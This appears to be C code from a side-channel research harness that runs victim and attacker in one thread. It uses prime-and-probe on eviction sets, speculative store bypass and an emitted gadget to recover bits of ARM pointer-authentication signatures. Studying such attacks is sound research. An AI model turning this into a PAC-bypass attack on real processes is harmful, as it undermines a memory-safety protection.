#define _GNU_SOURCE
#include <sys/mman.h>
#include "channel.h"

// Same thread, EL0: victim and attacker in one thread, prime and probe of the attacker's eviction set.
struct same_io {
    gadget_fn       gadget;
    struct slot    *slot;
    enum pac_switch sw;
    uint64_t        base;
    int             control;
    uint64_t        signature;
    int             bit;
};

static void same_next_round(void *ctx) {
    struct same_io *io = ctx;
    io->signature = pac_sign(io->base, rand_u64());
}
static void same_set_bit(void *ctx, int bit) {
    ((struct same_io *)ctx)->bit = bit;
}
static void same_set_mode(void *ctx, int mode) {
    struct same_io *io = ctx;
    if (0 > mode) {
        slot_secret(io->slot, io->sw, io->signature, io->base, io->bit);
    } else {
        slot_profile(io->slot, io->sw, io->base, io->bit, mode);
    }
}
static void same_transmit(void *ctx) {
    struct same_io *io = ctx;
    victim_transmit(io->gadget, io->slot, io->control);
}
static unsigned same_reveal(void *ctx) {
    struct same_io *io = ctx;
    return (unsigned)((io->signature >> 48) & 0x7f);
}

int run_same(const struct cfg *cfg, struct chan_stats *out) {
    if (M_BTB == cfg->med) {
        return run_same_btb(cfg, out);   // BTB uses the eviction-set attacker, not the generic prime/probe
    }
    pin_to_core(cfg->cpu);
    enable_store_bypass();
    void *base = victim_base_alloc(cfg->med);
    if (NULL == base) {
        fprintf(stderr, "victim base alloc failed\n");
        return 1;
    }
    struct attacker att = { 0 };
    attacker_setup(&att, cfg->med, cfg->tmr, (uint64_t)base);

    void *code = mmap(NULL, PAGE_BYTES, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (MAP_FAILED == code) {
        perror("mmap gadget");
        return 1;
    }
    struct slot slot = { 0 };
    struct same_io ctx = {
        .gadget = emit_gadget(code, cfg->sw, cfg->med), .slot = &slot,
        .sw = cfg->sw, .base = (uint64_t)base, .control = cfg->control,
    };
    struct victim_io io = {
        .ctx = &ctx, .next_round = same_next_round, .set_bit = same_set_bit,
        .set_mode = same_set_mode, .transmit = same_transmit, .reveal = same_reveal,
    };
    recover_rounds(&att, &io, cfg, out);
    return 0;
}
